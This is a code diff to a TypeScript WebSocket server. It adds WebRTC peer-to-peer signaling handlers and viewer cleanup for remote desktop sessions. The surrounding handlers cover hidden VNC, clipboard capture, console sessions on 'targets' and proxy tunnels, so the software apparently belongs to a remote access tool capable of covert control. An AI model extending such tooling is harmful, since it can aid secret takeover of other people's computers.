@@ -157,6 +157,9 @@ type WsLifecycleDeps = {
   handleHVNCInstalledAppsResult: (clientId: string, payload: any) => void;
   handleHVNCDXGIStatus: (clientId: string, payload: any) => void;
   handleClipboardContent: (clientId: string, payload: any) => void;
+  handleWebrtcP2PAnswer: (clientId: string, payload: any) => void;
+  handleWebrtcP2PIce: (clientId: string, payload: any) => void;
+  cleanupRdViewerP2P: (ws: ServerWebSocket<SocketData>) => void;
   cleanupVoiceViewer: (ws: ServerWebSocket<SocketData>) => void;
   cleanupDesktopAudioViewer: (ws: ServerWebSocket<SocketData>) => void;
   stopConsoleOnTarget: (target: ClientInfo | undefined, sessionId: string) => void;
@@ -723,6 +726,12 @@ export async function handleWebSocketMessage(
       case "clipboard_content":
         deps.handleClipboardContent(client.id, payload);
         break;
+      case "webrtc_p2p_answer":
+        deps.handleWebrtcP2PAnswer(client.id, payload);
+        break;
+      case "webrtc_p2p_ice":
+        deps.handleWebrtcP2PIce(client.id, payload);
+        break;
       case "proxy_data": {
         const connId = (payload as any).connectionId;
         const tunnelData = (payload as any).data;
@@ -779,6 +788,7 @@ export function handleWebSocketClose(
   }
 
   if (role === "rd_viewer") {
+    deps.cleanupRdViewerP2P(ws);
     let removedClientId = clientId;
     for (const [sid, sess] of sessionManager.getAllRdSessions().entries()) {
       if (sess.viewer === ws) {
